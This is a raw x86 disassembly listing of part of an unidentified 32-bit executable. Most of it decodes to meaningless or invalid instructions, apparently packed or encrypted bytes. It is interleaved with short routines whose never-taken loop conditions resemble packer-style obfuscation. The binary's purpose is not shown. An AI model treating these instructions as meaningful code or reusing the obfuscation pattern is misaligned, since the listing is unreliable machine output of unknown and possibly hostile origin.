  40e8f3:	xor    BYTE PTR [ecx],cl
  40e8f5:	jecxz  0x40e8ad
  40e8f7:	test   eax,0x69f72490
  40e8fc:	jne    0x40e8d2
  40e8fe:	adc    ecx,DWORD PTR [ecx+0x3082c2b3]
  40e904:	inc    ebp
  40e905:	xchg   ecx,eax
  40e906:	mov    al,0x39
  40e908:	pop    esi
  40e909:	adc    DWORD PTR [edx],0xffffff82
  40e90c:	mov    edi,edi
  40e90e:	arpl   sp,sp
  40e910:	sbb    edx,DWORD PTR [edi+0x47]
  40e913:	outs   dx,BYTE PTR ds:[esi]
  40e914:	(bad)  
  40e915:	adc    eax,0x523d897a
  40e91a:	sbb    al,0x63
  40e91c:	sbb    DWORD PTR [edx-0x22],esi
  40e91f:	sub    BYTE PTR gs:[ebx+0x2fa5f958],dl
  40e926:	cmp    ch,ch
  40e928:	mov    ah,0x8f
  40e92a:	adc    al,0x71
  40e92c:	cdq    
  40e92d:	dec    esp
  40e92e:	or     eax,esi
  40e930:	adc    BYTE PTR [eax],bl
  40e932:	fstp   QWORD PTR [edi-0x665fbfcd]
  40e938:	sbb    esp,edx
  40e93a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e93b:	push   ecx
  40e93c:	sahf   
  40e93d:	push   ecx
  40e93e:	inc    eax
  40e93f:	sub    edi,edx
  40e941:	sbb    ax,0xc9b0
  40e945:	stc    
  40e946:	mov    al,ds:0xbbff0978
  40e94b:	jle    0x40e99b
  40e94d:	mov    esp,0xb4def27c
  40e952:	gs rcl ebp,cl
  40e955:	loopne 0x40e953
  40e957:	xor    BYTE PTR [edi-0x7696f683],al
  40e95d:	or     DWORD PTR [ebx+ecx*2+0x3b],0x34e8a9ab
  40e965:	cmp    al,BYTE PTR [eax-0x56]
  40e968:	dec    esp
  40e969:	(bad)  [eax-0x55eb7700]
  40e96f:	(bad)  
  40e970:	sbb    dl,dl
  40e972:	pushf  
  40e973:	or     bh,ah
  40e975:	(bad)  
  40e976:	xor    DWORD PTR [edx],0xffffffeb
  40e979:	and    dh,bl
  40e97b:	jne    0x40e2bf
  40e981:	mov    eax,DWORD PTR [ebp+0xc]
  40e984:	pop    edi
  40e985:	xor    eax,esi
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0x42905f1d
  40e99c:	mov    al,ds:0x7e7ea486
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e9e0
  40e9a6:	idiv   DWORD PTR [eax]
  40e9a8:	not    DWORD PTR [edi-0x9]
  40e9ab:	jmp    0x40ea00
  40e9ad:	out    dx,al
  40e9ae:	mov    ebx,0x7b5c57b1
  40e9b3:	mov    dl,0x88
  40e9b5:	pop    ecx
  40e9b6:	out    dx,eax
  40e9b7:	lds    ebp,FWORD PTR [edi]
  40e9b9:	aad    0x0
  40e9bb:	bound  esp,QWORD PTR [eax-0x61]
  40e9be:	xor    ch,BYTE PTR [ecx+0x29]
  40e9c1:	jno    0x40e972
  40e9c3:	scas   al,BYTE PTR es:[edi]
  40e9c4:	add    BYTE PTR [ebp+edx*8+0x25],ah
  40e9c8:	xchg   edi,eax
  40e9c9:	pop    ss
  40e9ca:	mov    BYTE PTR [eax],bl
  40e9cc:	add    eax,0xc020c6dc
  40e9d1:	mov    bl,0xb7
  40e9d3:	fild   WORD PTR [esi-0x55]
  40e9d6:	into   
  40e9d7:	jp     0x40e9fc
  40e9d9:	push   esp
  40e9da:	push   cs
  40e9db:	xchg   ebx,eax
  40e9dc:	jle    0x40e9b3
  40e9de:	pop    eax
  40e9df:	dec    esp
  40e9e0:	inc    esi
  40e9e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9e2:	mov    ecx,0xb9cf5f0c
  40e9e7:	pop    ebp
  40e9e8:	jp     0x40e97e
  40e9ea:	jns    0x40e9ce
  40e9ec:	sar    DWORD PTR [edx+0x6bdc1291],0xe7
  40e9f3:	xor    al,0x89
  40e9f5:	lods   eax,DWORD PTR ds:[esi]
  40e9f6:	pop    ebx
  40e9f7:	add    esp,DWORD PTR [edx+eiz*1-0x31424a92]
  40e9fe:	popf   
  40e9ff:	stc    
  40ea00:	xor    eax,0x6bb7319
  40ea05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea06:	mov    WORD PTR [edi+0x55],?
  40ea09:	pop    ds
  40ea0a:	(bad)  
  40ea0b:	and    eax,0x87261c16
  40ea10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea11:	test   al,0x89
  40ea13:	loopne 0x40e9dd
  40ea15:	in     eax,dx
  40ea16:	mov    cl,ah
  40ea18:	adc    al,0xdb
  40ea1a:	dec    esp
  40ea1b:	fdiv   st,st(7)
  40ea1d:	ins    DWORD PTR es:[edi],dx
  40ea1e:	and    DWORD PTR [esi],0x1d
  40ea21:	mov    ds:0x3fdf6da0,eax
  40ea26:	mov    dl,0xc2
  40ea28:	imul   ebp,DWORD PTR [ebp+ebx*2+0x77],0xffffffc0
  40ea2d:	sbb    DWORD PTR ds:0x7b836f93,esp
  40ea33:	out    0x4,eax
  40ea35:	ja     0x40e9ce
  40ea37:	jmp    0x7fa9:0x8bb5c8d1
  40ea3e:	cdq    
  40ea3f:	dec    esp
  40ea40:	jae    0x40e9d2
  40ea42:	adc    edx,DWORD PTR [ecx-0x1de62ab0]
  40ea48:	cs sub dh,al
  40ea4b:	ret    0xdde1
  40ea4e:	jp     0x40e9f5
  40ea50:	mov    eax,DWORD PTR [ecx+0x76]
  40ea53:	mov    ds:0x1e2f7ab2,al
  40ea58:	test   cl,dl
  40ea5a:	and    BYTE PTR [esi-0x4b5abb2c],dl
  40ea60:	rcr    DWORD PTR [eax+edx*2+0x45f40e1e],1
  40ea67:	nop
  40ea68:	js     0x40ea80
  40ea6a:	outs   dx,BYTE PTR ds:[esi]
  40ea6b:	sub    eax,0x9342ef09
  40ea70:	dec    ebp
  40ea71:	jbe    0x40ea4d
  40ea73:	test   eax,0x6f4796f1
  40ea78:	pushf  
  40ea79:	sbb    esi,esi
  40ea7b:	dec    eax
  40ea7c:	jbe    0x40ea77
  40ea7e:	adc    ch,BYTE PTR es:[esi-0x1c]
  40ea82:	add    al,0xbe
  40ea84:	dec    edx
  40ea85:	aaa    
  40ea86:	xor    ecx,DWORD PTR [ecx+0x14]
  40ea89:	or     eax,0x514ebbb6
  40ea8e:	mov    al,ds:0x542b46a2
  40ea93:	mov    WORD PTR [esi+0x7a],ds
  40ea96:	mov    esp,0x2b6f4fc0
  40ea9b:	xor    BYTE PTR [esi-0xcbef7ec],bl
  40eaa1:	jg     0x40ea4b
  40eaa3:	dec    edi
  40eaa4:	aas    
  40eaa5:	inc    ecx
  40eaa6:	mov    cs,WORD PTR [esi]
  40eaa8:	sbb    bl,BYTE PTR [esi]
  40eaaa:	int3   
  40eaab:	int    0xc4
  40eaad:	ds pause 
  40eab0:	inc    ebp
  40eab1:	in     al,dx
  40eab2:	call   0x7216:0x7c81c9b5
  40eab9:	or     ebp,eax
  40eabb:	mov    DWORD PTR [edx-0x30],edx
  40eabe:	out    dx,al
  40eabf:	cmc    
  40eac0:	enter  0xc303,0x5b
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dl,BYTE PTR [esi]
  40ebb4:	stc    
  40ebb5:	sbb    edi,DWORD PTR [edi-0x66]
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb89
  40ebc0:	or     al,0xaf
  40ebc2:	pop    esp
  40ebc3:	mov    dl,0x49
  40ebc5:	mov    esp,0x4d6aff0
  40ebca:	lods   eax,DWORD PTR ds:[esi]
  40ebcb:	sbb    BYTE PTR [esp+ecx*1+0x77],al
  40ebcf:	xchg   esp,eax
  40ebd0:	(bad)  
  40ebd1:	es call 0xfe67:0xdb09b1f1
  40ebd9:	cmc    
  40ebda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebdb:	loopne 0x40ebaa
  40ebdd:	jecxz  0x40ebb6
  40ebdf:	xchg   ecx,eax
  40ebe0:	ffree  st(7)
  40ebe2:	pop    esi
  40ebe3:	sar    edi,1
  40ebe5:	leave  
  40ebe6:	pop    esp
  40ebe7:	out    dx,al
  40ebe8:	jnp    0x40ebde
  40ebea:	test   al,0xd9
  40ebec:	push   eax
  40ebed:	sbb    DWORD PTR [eax],esi
  40ebef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebf0:	cs mov dh,0xec
  40ebf3:	out    0x77,al
  40ebf5:	shr    BYTE PTR [esp+edx*2+0x4d],0x2b
  40ebfa:	out    dx,al
  40ebfb:	call   0xd4c4eaa6
  40ec00:	stos   DWORD PTR es:[edi],eax
  40ec01:	pop    eax
  40ec02:	es std 
  40ec04:	cmp    dl,BYTE PTR [eax-0x6c4e9ee2]
  40ec0a:	jge    0x40eba8
  40ec0c:	jge    0x40ec12
  40ec0e:	xor    DWORD PTR [esi+0x476e2f16],esi
  40ec14:	sub    dl,BYTE PTR [esi+0x44]
  40ec17:	call   0x78d5c5b7
  40ec1c:	mov    ah,BYTE PTR [edi]
  40ec1e:	lds    edx,FWORD PTR [ebp+eiz*1-0x5a2662ec]
  40ec25:	and    BYTE PTR [esi+0x39],ch
  40ec28:	bound  edi,QWORD PTR [edx]
  40ec2a:	arpl   bp,bx
  40ec2c:	hlt    
  40ec2d:	inc    eax
  40ec2e:	or     DWORD PTR [ebx],esi
  40ec30:	dec    esi
  40ec31:	fimul  WORD PTR [eax-0x48]
  40ec34:	cmp    BYTE PTR [eax+eiz*1],bl
  40ec37:	cmp    dh,al
  40ec39:	in     al,dx
  40ec3a:	cmc    
  40ec3b:	sub    bh,BYTE PTR [ebx-0x29]
  40ec3e:	stos   BYTE PTR es:[edi],al
  40ec3f:	cs lahf 
  40ec41:	jl     0x40ec49
  40ec43:	xor    edx,DWORD PTR ds:0x5f140f28
  40ec49:	sub    esp,esp
  40ec4b:	add    ecx,DWORD PTR [ebx+esi*4]
  40ec4e:	(bad)  
  40ec50:	and    BYTE PTR [ebx-0x41],dl
  40ec53:	push   ss
  40ec54:	push   edx
  40ec55:	leave  
  40ec56:	lock jno 0x40ec4f
  40ec59:	retw   
  40ec5b:	mov    fs,WORD PTR [edx+ebx*2+0x61]
  40ec5f:	adc    bh,BYTE PTR [edi-0x189dcc22]
  40ec65:	push   cs
  40ec66:	add    DWORD PTR [bx+di],eax
  40ec69:	test   BYTE PTR ds:0x8b994eb5,cl
  40ec6f:	pop    eax
  40ec70:	repz dec esi
  40ec72:	push   esp
  40ec73:	ins    DWORD PTR es:[edi],dx
  40ec74:	and    ebx,eax
  40ec76:	in     al,dx
  40ec77:	jmp    FWORD PTR [eax+eax*2]
  40ec7a:	aad    0xb
  40ec7c:	inc    ebp
  40ec7d:	cmp    DWORD PTR [eax-0x17],edi
  40ec80:	pop    ss
  40ec81:	mov    al,ds:0xd6d4251d
  40ec87:	jbe    0x40ec4e
  40ec89:	mov    al,ds:0xd9e58300
  40ec8e:	xor    BYTE PTR [edx+0x9],ah
  40ec91:	fldcw  WORD PTR [esi]
  40ec93:	cmp    ch,BYTE PTR [ebp-0x4b]
  40ec96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec97:	mov    ecx,es
  40ec99:	xor    ebp,DWORD PTR [esi+0x15e05e51]
  40ec9f:	adc    DWORD PTR [edx+0x24],edx
  40eca2:	jg     0x40ec31
  40eca4:	mov    ch,0x1a
  40eca6:	xlat   BYTE PTR ds:[ebx]
  40eca7:	(bad)
  40ecaa:	nop
  40ecab:	xor    dl,BYTE PTR [esi]
  40ecad:	mov    eax,0x62c3d3cb
  40ecb2:	xchg   ecx,eax
  40ecb3:	dec    ebp
  40ecb4:	loopne 0x40ed0c
  40ecb6:	and    dl,BYTE PTR [ecx+0x28]
  40ecb9:	pop    ebx
  40ecba:	loope  0x40ecef
  40ecbc:	(bad)  
  40ecbd:	mov    ah,0x33
  40ecbf:	fimul  DWORD PTR [ecx]
  40ecc1:	jnp    0x40ec59
  40ecc3:	imul   ecx,DWORD PTR [edx+0x76],0x12
  40ecc7:	fwait
  40ecc8:	sub    al,0x98
  40ecca:	push   ss
  40eccb:	pop    ss
  40eccc:	push   es
  40eccd:	fiadd  WORD PTR [ecx+0x7f]
  40ecd0:	cwde   
  40ecd1:	in     eax,0x80
  40ecd3:	(bad)  
  40ecd4:	test   al,0x63
  40ecd6:	or     bl,BYTE PTR [esi-0x47a3eb1a]
  40ecdc:	aas    
  40ecdd:	test   DWORD PTR [eax+eiz*8+0x6471282b],ebp
  40ece4:	je     0x40ed17
  40ece6:	xlat   BYTE PTR ds:[ebx]
  40ece7:	mov    edi,DWORD PTR [esi]
  40ece9:	icebp  
  40ecea:	cdq    
  40eceb:	adc    eax,0xe3ae9263
  40ecf0:	sub    DWORD PTR [eax-0x344b7d0e],edx
  40ecf6:	mov    ah,0xe5
  40ecf8:	add    eax,0x62b65e68
  40ecfd:	sbb    al,0xd0
  40ecff:	xor    DWORD PTR [edi+ebp*2+0x29],edx
  40ed03:	mov    ecx,0x39e86736
  40ed08:	pop    ebp
  40ed09:	or     edx,DWORD PTR [ebx+0xa]
  40ed0c:	fidiv  DWORD PTR [eax+ecx*4]
  40ed0f:	fild   QWORD PTR [ecx-0x69]
  40ed12:	jae    0x40ed15
  40ed14:	pop    esp
  40ed15:	(bad)  
  40ed16:	and    al,0x2e
  40ed18:	and    eax,0x36455a59
  40ed1d:	mov    edx,0x6f927b6e
  40ed22:	ror    BYTE PTR [ebx+edx*1],1
  40ed25:	in     eax,0xd7
  40ed27:	push   es
  40ed28:	mov    bl,0x87
  40ed2a:	adc    DWORD PTR [edi+0x2b522cb4],ebp
  40ed30:	mov    al,0x92
  40ed32:	or     cl,BYTE PTR es:[eax+0x24f9c623]
  40ed39:	pop    ds
  40ed3a:	dec    edi
  40ed3b:	cmp    ch,BYTE PTR [edi+esi*8]
  40ed3e:	cmp    ebp,DWORD PTR [eax+edi*4+0x38]
  40ed42:	out    0xf,eax
  40ed44:	adc    BYTE PTR [edi+0x1c],al
  40ed47:	gs push edi
  40ed49:	test   eax,0xf8311bb
  40ed4e:	mov    ebp,0x5b3afd09
  40ed53:	ret    
  40ed54:	fisubr WORD PTR [edx]
  40ed56:	jle    0x40edd0
  40ed58:	pop    ecx
  40ed59:	lahf   
  40ed5a:	xchg   ch,dl
  40ed5c:	xrelease xchg DWORD PTR [ecx+0x4f],ebx
  40ed60:	push   ebp
  40ed61:	push   ebp
  40ed62:	mov    ?,WORD PTR [eax]
  40ed64:	jno    0x40ed78
  40ed66:	xchg   esp,eax
  40ed67:	std    
  40ed68:	cmp    ecx,edx
  40ed6a:	or     BYTE PTR [ebp-0x62a915d0],cl
  40ed70:	add    BYTE PTR [eax+0x721cbd1f],ch
  40ed76:	pop    esp
  40ed77:	fild   QWORD PTR [eax]
  40ed79:	pop    edi
  40ed7a:	retf   
  40ed7b:	mov    esp,0x1cacb69
  40ed80:	or     eax,0xa556dc59
  40ed85:	inc    ebx
  40ed86:	add    al,0x1e
  40ed88:	ror    DWORD PTR [esi+0x1173b259],1
  40ed8e:	mov    esp,0xd4834006
  40ed93:	repz loop 0x40ed65
  40ed96:	mov    esp,0xc2336f6d
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x24393f58]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	(bad)
  40ee79:	int3   
  40ee7a:	mov    BYTE PTR [eax-0x16],ah
  40ee7d:	retf   
  40ee7e:	mov    dh,0x92
  40ee80:	repnz fnsetpm(287 only) 
  40ee83:	lods   eax,DWORD PTR ds:[esi]
  40ee84:	push   es
  40ee85:	int    0x67
  40ee87:	popa   
  40ee88:	xchg   esi,eax
  40ee89:	sub    al,0xe1
  40ee8b:	rcr    BYTE PTR [edi-0x14],1
  40ee8e:	sbb    dh,BYTE PTR [edx]
  40ee90:	gs inc edx
  40ee92:	and    DWORD PTR [ebx-0x5a],ebx
  40ee95:	dec    esp
  40ee96:	mov    edx,DWORD PTR [ebx]
  40ee98:	sbb    eax,0x358f999b
  40ee9d:	pop    es
  40ee9e:	and    esi,DWORD PTR [ebp+0x4cbdc7db]
  40eea4:	sub    ebx,DWORD PTR [edx+edi*8-0x75]
  40eea8:	(bad)  
  40eea9:	mov    ch,0xd9
  40eeab:	sub    eax,edi
  40eead:	xchg   DWORD PTR [ecx+0x1be370a2],ebp
  40eeb3:	jae    0x40ee5e
  40eeb5:	call   0xfbea9011
  40eeba:	ds je  0x40ee76
  40eebd:	inc    edi
  40eebe:	pop    edx
  40eebf:	ins    BYTE PTR es:[edi],dx
  40eec0:	xchg   esi,eax
  40eec1:	mov    dh,0x41
  40eec3:	mov    WORD PTR [esi+0x577432eb],gs
  40eec9:	inc    ecx
  40eeca:	mov    dl,0x82
  40eecc:	push   cs
  40eecd:	push   eax
  40eece:	call   0xfe0ab7de
  40eed3:	sbb    DWORD PTR [eax],edi
  40eed5:	std    
  40eed6:	popf   
  40eed7:	jl     0x40ef51
  40eed9:	mov    ecx,DWORD PTR [ebx-0x6d]
  40eedc:	pop    es
  40eedd:	fisub  WORD PTR [edx-0x14]
  40eee0:	mov    eax,0xf7e39afa
  40eee5:	sub    ecx,DWORD PTR [eax-0x381287b2]
  40eeeb:	bound  esp,QWORD PTR ds:0x7cf2e086
  40eef1:	ror    BYTE PTR [esp+eax*1+0xc75b973],cl
  40eef8:	jl     0x40ee98
  40eefa:	loopne 0x40ef1b
  40eefc:	push   edi
  40eefd:	loop   0x40eecf
  40eeff:	jnp    0x40eea1
  40ef01:	outs   dx,BYTE PTR ds:[esi]
  40ef02:	mov    cl,0x8d
  40ef04:	sub    ecx,DWORD PTR [ebp+ebx*1-0x1d]
  40ef08:	into   
  40ef09:	jbe    0x40eecb
  40ef0b:	pop    ebp
  40ef0c:	enter  0x2a4b,0x34
  40ef10:	pop    es
  40ef11:	aas    
  40ef12:	cmp    bh,al
  40ef14:	lods   al,BYTE PTR ds:[esi]
  40ef15:	into   
  40ef16:	sbb    eax,0x9294f2f1
  40ef1b:	mov    ah,0xe7
  40ef1d:	push   esi
  40ef1e:	mov    ebx,0x960c1e87
  40ef23:	cmp    dl,bh
  40ef25:	push   cs
  40ef26:	addr16 mov dh,0x3b
  40ef29:	xchg   DWORD PTR [edx+0x23],esp
  40ef2c:	enter  0x322d,0x3
  40ef30:	or     bl,BYTE PTR [ecx]
  40ef32:	push   ecx
  40ef33:	imul   esp,DWORD PTR [eax-0x1e67e2c1],0x49437d8a
  40ef3d:	ins    WORD PTR es:[edi],dx
  40ef3f:	push   esp
  40ef40:	add    DWORD PTR fs:[edx],0x5b70deed
  40ef47:	pop    ecx
  40ef48:	pop    es
  40ef49:	adc    eax,0xbde4d309
  40ef4e:	pushf  
  40ef4f:	sub    BYTE PTR [ecx-0x4b74a4ce],bh
  40ef55:	push   ebx
  40ef56:	jns    0x40ef3f
  40ef58:	sbb    WORD PTR [ebx-0x7e],0xff93
  40ef5d:	stos   BYTE PTR es:[edi],al
  40ef5e:	sub    al,0xac
  40ef60:	daa    
  40ef61:	scas   eax,DWORD PTR es:[edi]
  40ef62:	cmp    ebp,0x10
  40ef65:	sbb    esi,DWORD PTR [ebp+0x410f5aaa]
  40ef6b:	out    0x69,eax
  40ef6d:	push   ecx
  40ef6e:	dec    ecx
  40ef6f:	add    DWORD PTR [eax+ecx*4-0x124bf34f],0x29e3cc42
  40ef7a:	ss jns 0x40ef31
  40ef7d:	int3   
  40ef7e:	jmp    0x40efd8
  40ef80:	push   ebx
  40ef81:	aaa    
  40ef82:	pop    ecx
  40ef83:	daa    
  40ef84:	arpl   WORD PTR ds:0x7cceab6e,bx
  40ef8a:	xchg   esi,eax
  40ef8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef8c:	ret    
  40ef8d:	xchg   esp,eax
  40ef8e:	and    DWORD PTR [ebp+0x549715bc],ecx
  40ef94:	cmp    al,0xdd
  40ef96:	aam    0xe4
  40ef98:	mov    edi,0xa6e8be11
  40ef9d:	ret    
  40ef9e:	retf   0x6c0e
  40efa1:	mov    dl,0xae
  40efa3:	adc    cl,BYTE PTR [edi+0x60]
  40efa6:	sub    eax,0x51030432
  40efab:	(bad)  
  40efac:	push   ebx
  40efad:	popa   
  40efae:	pop    edx
  40efaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efb0:	mov    ecx,0x8a1b77f5
  40efb5:	shl    DWORD PTR [ebp-0x3d],cl
  40efb8:	push   ebp
  40efb9:	pop    edi
  40efba:	das    
  40efbb:	sub    DWORD PTR [ebx+0x5222de0],0x4bbb6bca
  40efc5:	cdq    
  40efc6:	push   ds
  40efc7:	ins    DWORD PTR es:[edi],dx
  40efc8:	out    0x18,eax
  40efca:	pushf  
  40efcb:	xor    DWORD PTR [ecx+0x5d],ebp
  40efce:	fisttp QWORD PTR [edi+0x63]
  40efd1:	pop    edi
  40efd2:	out    0xcd,al
  40efd4:	dec    ebp
  40efd5:	cli    
  40efd6:	mov    edi,0x90354fb8
  40efdb:	hlt    
  40efdc:	pop    es
  40efdd:	stos   DWORD PTR es:[edi],eax
  40efde:	aas    
  40efdf:	(bad)  
  40efe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efe1:	dec    eax
  40efe2:	jno    0x40efec
  40efe4:	test   dh,0xca
  40efe7:	jg     0x40effc
  40efe9:	fisubr WORD PTR [esi]
  40efeb:	inc    ebx
  40efec:	cli    
  40efed:	and    DWORD PTR gs:[eax-0x80],eax
  40eff1:	fnstcw WORD PTR [ebx]
  40eff3:	xor    edx,DWORD PTR [edi]
  40eff5:	scas   al,BYTE PTR es:[edi]
  40eff6:	xchg   edx,eax
  40eff7:	or     eax,0x52ac4c91
  40effc:	jbe    0x40f035
  40effe:	jmp    0x40f013
  40f000:	push   esp
  40f001:	mov    eax,0xfa162f01
  40f006:	(bad)  
  40f007:	xchg   ebx,eax
  40f008:	pop    ebp
  40f009:	xchg   ecx,eax
  40f00a:	imul   esp,DWORD PTR [ebp-0x2c317a9d],0x9
  40f011:	int3   
  40f012:	ret    
  40f013:	lahf   
  40f014:	test   eax,0xba12e133
  40f019:	mov    bl,0x65
  40f01b:	inc    esp
  40f01c:	jecxz  0x40f028
  40f01e:	in     eax,0x23
  40f020:	mov    edi,0x50e5548b
  40f025:	dec    ebp
  40f026:	adc    bl,BYTE PTR [edx+0x74]
  40f029:	into   
  40f02a:	test   eax,0xb273d4bc
  40f02f:	inc    eax
  40f030:	lea    edi,[eax]
  40f032:	retf   0x8f69
  40f035:	loope  0x40efe4
  40f037:	adc    esi,DWORD PTR [edi]
  40f039:	data16 arpl WORD PTR [ecx-0x12],di
  40f03d:	push   0xdb94706e
  40f042:	adc    al,ch
  40f044:	jne    0x40f078
  40f046:	xchg   esi,eax
  40f047:	shr    BYTE PTR [esi-0x48],1
  40f04a:	int    0xbe
  40f04c:	pop    esp
  40f04d:	test   BYTE PTR [ebx-0x19],0x8b
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x922d1594,ebx
  40f076:	pusha  
  40f077:	sbb    esi,edx
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	cmp    BYTE PTR [edx+0x5b751974],ch
  40f086:	pop    ebp
  40f087:	jmp    0x4a73923b
  40f08c:	mov    bh,0xe7
  40f08e:	push   0x7fc92559
  40f093:	out    dx,al
  40f094:	call   0xf864:0xe76485ff
  40f09b:	mov    al,ds:0xb20e1413
  40f0a0:	mov    dh,0x26
  40f0a2:	aad    0xb7
  40f0a4:	mov    BYTE PTR [eax+0x2f037352],ch
  40f0aa:	fst    DWORD PTR [ebp+ebx*2+0x5f]
  40f0ae:	lds    ebx,FWORD PTR [ebp+0x9]
  40f0b1:	(bad)  
  40f0b2:	xchg   edi,eax
  40f0b3:	jb     0x40f0fd
  40f0b5:	mov    cl,0x79
  40f0b7:	daa    
  40f0b8:	push   ebp
  40f0b9:	pushf  
  40f0ba:	and    ecx,ebx
  40f0bc:	adc    BYTE PTR [edi+0x7335efc],ch
  40f0c2:	pop    ebx
